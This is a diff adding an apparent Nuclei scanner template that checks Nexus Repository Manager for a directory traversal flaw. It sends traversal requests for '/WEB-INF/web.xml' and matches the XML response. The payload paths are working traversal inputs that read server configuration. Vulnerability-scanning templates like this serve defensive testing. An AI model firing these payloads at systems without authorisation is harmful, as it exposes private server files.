@@ -1,0 +1,21 @@
+id: nexus-repository-manager-directory-traversal
+info:
+  name: Nexus Repository Manager Directory Traversal
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: directory-traversal
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/static//../WEB-INF/web.xml"
+      - "{{BaseURL}}/nexus/static//../WEB-INF/web.xml"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<?xml"
+      - type: word
+        part: body
+        words:
+          - "<listener-class>org.sonatype.nexus.webapp."
